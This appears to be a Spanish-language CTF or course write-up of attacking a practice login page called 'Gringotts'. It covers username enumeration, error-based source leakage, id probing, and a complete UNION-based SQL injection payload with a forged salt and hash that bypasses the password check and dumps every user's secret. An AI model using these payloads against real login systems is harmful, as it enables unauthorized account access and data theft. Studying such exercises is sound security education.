
# Ejercicio 1

Luego de ingresar a la plataforma "Gringotts", solo vemos un formulario para hacer login.

Empezamos probando las cosas simples para obtener algo de informacion:

- Intentar logearse con el usuario `admin`, password `admin`. Esto nos muestra un mensaje:
> No existe el usuario admin!

Genial, podemos saber si existe o no un usuario determinado al parecer

- Intentar logearse con `bob`, password `bob`. Esto nos muestra un mensaje:
> Password incorrecta para bob!

Genial, podemos saber saber si ingresamos bien el usuario, pero mal la password

Ahora bien, con esto en mente, probemos algo de SQL injection

- Intentar logearse con usuario `' OR '1' = '1`, password `' OR '1' = '1`. La idea de esta injection es intentar romper una consulta como `SELECT * FROM users WHERE username = '{username}' AND password = '{password}'`
> Password incorrecta para ' OR '1' = '1!

Ok, entonces el usuario ese existe? No creo. La consulta no debe ser como imaginamos. Ahora bien, intentemos romper la consulta SQL, para ver si tenemos algun stack trace

- Intentar logearse con usuario `' OR --`, password `asd`. Deberia dar error, ya que no hay nada despues de la keyword `OR`.

Bingo, tenemos el stack trace, y no solo eso, tenemos el codigo fuente del archivo `login`

Algunas lineas utiles de ese archivo:

    query = """SELECT id, password_hash, salt FROM users
	           WHERE username = '%s' LIMIT 1""" % username
    cursor.execute(query)
    res = cursor.fetchone()

    if not res:
      flash("No existe el usuario %s!" % username)
      return redirect(url_for('index'))
    
    user_id, password_hash, salt = res
    calculated_hash = hashlib.sha256( salt + password + salt) # <-.->
    if calculated_hash.hexdigest() != password_hash:
      flash("Password incorrecta para %s!" % username)
      return redirect(url_for('index'))
    
    session['user_id'] = user_id


Tenemos la query de SQL, vemos que solo podremos extraer una sola fila de la consulta

Si no hay fila, se devuelve que no hay un usuario con ese nombre

Si hay fila, tomamos la salt, la prependeamos y apendeamos a la password, tiramos sha256 de eso y nos fijamos si nos da igual que el hash de la database

En ese caso, se setea el `user_id` en la session, el cual se usa en esta parte

    @app.route('/')
    def index():
      """Main page."""
      try:
        user_id = session['user_id']
      except KeyError:
        secret = None
      else:
        secret = secrets[str(user_id)]
      return render_template('index.html', secret=secret)

Entonces, necesitamos el `user_id` del usuario al cual queremos acceder, para podes printear el `secret`

En este momento me puse a hacer bastantes cosas que no me llevaron a nada concreto, pero me sirvieron para resolver los puntos siguientes del ejercicio

Podemos injectar la query `' OR id >= X` para averiguar cual es el id mas grande en la database. Por esto codie en python un script que use binary search para obtener el valor de ese id mas grande

Una vez sacado ese valor (525), podemos probar la query `' OR id = X` para ver que ids realmente tienen usuarios, los cuales son `[1, 2, 3, 4, 5, 525]`

Y ahora si, despues de pensar un rato como romper la parte del hashing, se me ocurrio la idea de no romperlo justamente, sino de hacer que de True.

Basicamente la idea es injectar mi propio `salt` y mi propio `password_hash`, para que me de True cuando haga la llamada

Para esto hice uso de la keyword `UNION` con la consulta:
`' UNION SELECT id, {hash_propio}, {salt_propia} FROM users WHERE username = X --`

Como la primera parte de la consulta nos devolvera `[]`, pues no hay un user con usuario vacio, simplemente obtendremos lo que dice la segunda parte de la consulta.
Ahora esta todo listo, solo hay que dar los datos
Por comodidad elegi `salt = 1`, `hash = pepe`, usando `hashlib.sha256(salt+pass+salt).hexdigest()` obtuve `4784bdfeb97508c05b914989c97eaeb8ff5bfc92627fea24bd49cfe99d4f7bd5`

Finalmente, me intente logear con usuario
usuario: `' UNION SELECT id, '4784bdfeb97508c05b914989c97eaeb8ff5bfc92627fea24bd49cfe99d4f7bd5', '1' FROM users WHERE username = 'bob' --`
password: `pepe`

Result: `Your secret is: Gate's Gm@Il Passw0rd R3m1nder: Ennyn Durin Aran Moria. Pedo Mellon a Minno. Im Narvi hain echant. Celebrimbor o Eregion teithant i thiw hin.`

Googleando rapido encontre que es una frase de un libro de Tolkien. La password de acceso al sector 7-G es probablemente `friend`

Obviamente podemos cambiar la query facilmente para recuperar los secretos de todos los usuarios de este sistema, sounds like FUN

- id 1 does not have secrets
- id 2 is bob
- id 3 `Coca-cola recipes: Carbonated water, sugar, natural flavorings, caffeine, phosphoric acid & naranpol flavor`
- id 4 `se-html5-album-audio-player is broken`
- id 5 `Kaley Cuoco phone: 1-212-733-2323`
- id 6 `The BUE System is unsafe or at least doubtful`

=)
